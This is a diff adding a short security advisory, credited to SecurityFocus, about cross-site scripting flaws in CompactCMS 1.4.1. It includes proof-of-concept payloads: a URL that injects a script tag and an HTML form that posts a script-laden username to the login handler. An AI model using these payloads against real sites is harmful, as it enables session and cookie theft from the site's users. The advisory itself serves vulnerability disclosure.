@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/44949/info
+
+CompactCMS is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Attacker-supplied script code would execute in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials.
+
+CompactCMS 1.4.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/?a="><script>alert("XSS");</script>
+<form action="http://www.example.com/lib/includes/auth.inc.php" method="post" name="main" >
+<input type="hidden" name="userName" value="123&#34;><script>alert(&#34;XSS&#34;);</script>" />
+<input type="hidden" name="userPass" value="123" />
+<input type="submit" value="Submit" name="submit" />
+</form>
